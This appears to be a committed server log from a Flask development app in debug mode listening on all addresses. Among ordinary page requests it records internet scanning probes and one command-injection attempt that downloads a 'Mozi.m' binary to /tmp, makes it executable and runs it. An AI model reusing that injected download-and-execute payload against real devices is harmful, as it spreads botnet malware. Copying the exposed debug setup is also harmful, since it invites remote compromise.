@@ -1,0 +1,31 @@
+nohup: ignoring input
+ * Serving Flask app 'app'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.130:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 594-475-982
+194.9.108.120 - - [01/Aug/2025 11:35:49] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [01/Aug/2025 11:35:49] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [01/Aug/2025 11:35:52] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [01/Aug/2025 11:35:52] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+212.40.1.6 - - [01/Aug/2025 11:35:53] "GET / HTTP/1.1" 200 -
+212.40.1.6 - - [01/Aug/2025 11:35:53] "GET /static/css/style.css HTTP/1.1" 200 -
+204.76.203.219 - - [01/Aug/2025 11:58:16] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [01/Aug/2025 12:11:04] "GET /view/3 HTTP/1.1" 200 -
+194.9.108.120 - - [01/Aug/2025 12:11:04] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+31.31.48.132 - - [01/Aug/2025 12:11:09] "GET /view/3 HTTP/1.1" 200 -
+31.31.48.132 - - [01/Aug/2025 12:11:09] "GET /static/css/style.css HTTP/1.1" 200 -
+27.216.104.23 - - [01/Aug/2025 12:35:48] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+27.216.104.23 - - [01/Aug/2025 12:35:48] "[31m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" 400 -
+149.50.96.114 - - [01/Aug/2025 12:43:45] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [01/Aug/2025 12:53:24] "[33mPOST /bapply.cgi HTTP/1.1[0m" 404 -
+149.50.96.114 - - [01/Aug/2025 13:09:49] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+91.224.92.17 - - [01/Aug/2025 13:12:01] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [01/Aug/2025 13:18:16] code 400, message Bad request version ('}')
+141.98.11.57 - - [01/Aug/2025 13:18:16] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+149.50.96.5 - - [01/Aug/2025 13:20:54] "[33mGET /cgi-bin/index.html HTTP/1.1[0m" 404 -
